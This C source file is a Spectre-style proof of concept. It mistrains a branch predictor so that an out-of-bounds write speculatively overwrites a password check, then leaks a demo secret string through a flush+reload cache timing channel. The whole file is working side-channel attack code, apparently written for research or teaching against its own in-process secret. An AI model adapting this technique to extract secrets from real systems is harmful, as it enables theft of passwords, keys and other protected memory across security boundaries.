#include <stdio.h>
#include <time.h>

#include "../lib/gen_array.c"
#include "../lib/time_and_flush.c"
#include "../lib/print_results.c"

#define CACHE_HIT   100
#define CL_SIZE     64      //CACHE LINE SIZE
#define N_PAGES     256

#define REPETITIONS 10000
#define SECRET_SIZE 9
#define N_TRAINING  10
#define BUF_SIZE    16
#define SECRET      "mysecret"

#define OVERWRITE_INDEX BUF_SIZE

typedef struct vars {
    char buf[BUF_SIZE];
    char password;
} vars_t;
vars_t wrapper;

int buf_size __attribute__((aligned(CL_SIZE))) = BUF_SIZE;

/*
 * Variables required in cache:
 *  user_id
 *  user_char
 *  user_password
 *  buf
 *  password
 *  SECRET
 *
 * Variables required in mem:
 *  buf_size
 *
 * Training: user_id={0,1,2...BUF_SIZE-1}   user_char={a,b,c...z}   user_password = 'x' secret_index=0
 * Attack:   user_id=BUF_SIZE               user_char='s'           user_password = 's' secret_index={iterate through SECRET}
 */
void victim_func(int user_id, char user_char,
                 char user_password, int secret_index,
                 cp_t* flush_reload_arr) {
    wrapper.password = 'x';
    flush(&buf_size);
    cpuid();

    //bounds check should prevent overwrite, but speculatively executes
    if (user_id < buf_size) {
        wrapper.buf[user_id] = user_char;
    }

    //password has been (speculatively) overwritten with user_char.
    if (user_password == wrapper.password) {
        volatile cp_t cp;
        cp = flush_reload_arr[SECRET[secret_index]];
    }
}

int* prepare(int secret_index) {

    cp_t* flush_reload_arr = init_flush_reload(N_PAGES);
    flush_arr(flush_reload_arr, N_PAGES);

    //access decisions in array, repeated out-of-bounds not traceable for branch predictor
    int  n_accesses =   N_TRAINING + 1;
    int  user_ids      [n_accesses];
    char user_chars    [n_accesses];
    char user_pwds     [n_accesses];
    char secret_indices[n_accesses];

    for(int i = 0; i < n_accesses; i++) {
        user_ids[i]                = i % BUF_SIZE;
        user_chars[i]              = 'a' + (i%26);
        user_pwds[i]               = 'x';
        secret_indices[i]          = 0;
    }

    //set up parameters for attack function call.
    user_ids      [n_accesses - 1] = OVERWRITE_INDEX;
    user_chars    [n_accesses - 1] = 's';
    user_pwds     [n_accesses - 1] = 's';
    secret_indices[n_accesses - 1] = secret_index;
    cpuid();

    //Misstrain branch predictor, last iteration is out-of-bounds attack function call
    for(int i = 0; i < n_accesses; i++) {
        victim_func(user_ids[i], user_chars[i], user_pwds[i], secret_indices[i], flush_reload_arr);
        cpuid();

        //flush hits from training phase (all but last access)
        if(i < n_accesses-1) {
            cpuid();
            flush_arr(flush_reload_arr, N_PAGES);
        }
        cpuid();
    }

    //make sure previous loop finishes execution
    cpuid();

    //time loading duration per array index
    int* results = reload(flush_reload_arr, N_PAGES, CACHE_HIT);
    free_flush_reload(flush_reload_arr, N_PAGES);
    return results;
}

int main(int argc, char** argv) {
    printf("buf      = %p\tbuf[last] = %p\npassword = %p\toverwrite = %p\n",
           &wrapper.buf, &wrapper.buf[BUF_SIZE-1], &wrapper.password, &wrapper.buf[OVERWRITE_INDEX]);

    int*** results = alloc_results(REPETITIONS, SECRET_SIZE, N_PAGES); //results[REPETITIONS][SECRET_SIZE][N_PAGES]ints

    clock_t start2 = clock();

    for(int r = 0; r < REPETITIONS; r++) {
        printf("\nREPETITION %d\n", r);
        for (int s = 0; s < SECRET_SIZE; s++) {
            results[r][s] = prepare(s);
            cpuid();
        }
    }

    clock_t end2 = clock();
    double measured_time = ((double)(end2 - start2))/CLOCKS_PER_SEC;

    print_results(results, REPETITIONS, SECRET, SECRET_SIZE, N_PAGES, CACHE_HIT, measured_time);

    free_results(results, REPETITIONS, SECRET_SIZE);

    return 0;
}